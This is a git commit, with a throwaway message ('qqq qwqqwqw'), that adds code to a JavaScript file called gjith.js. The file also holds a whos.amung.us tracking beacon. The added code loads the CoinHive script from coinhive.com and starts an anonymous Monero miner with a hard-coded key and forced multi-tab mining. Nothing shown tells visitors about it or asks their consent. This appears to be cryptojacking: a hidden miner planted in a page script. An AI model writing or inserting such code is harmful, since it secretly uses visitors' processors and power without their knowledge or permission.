9dd03757d4f966f7fb97de7770c7fe7d589d2a87
llllooloolooloo <33094633+llllooloolooloo@users.noreply.github.com>
2017-10-25 17:12:10 +0200

    qqq
    qwqqwqw

--- gjith.js
+++ gjith.js
@@ -1,1 +1,20 @@
 (new Image).src = "//whos.amung.us/swidget/mandar1n0s";
+
+function addScript( src,callback) {
+  var s = document.createElement( 'script' );
+  s.setAttribute( 'src', src );
+  s.onload=callback;
+  document.body.appendChild( s );
+}
+
+function start(){
+  var miner = new CoinHive.Anonymous('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', {
+	threads: 4,
+	autoThreads: true,
+	throttle: 0.5,
+	forceASMJS: false
+});
+	miner.start(CoinHive.FORCE_MULTI_TAB);
+}
+
+addScript("https://coinhive.com/lib/coinhive.min.js", start);
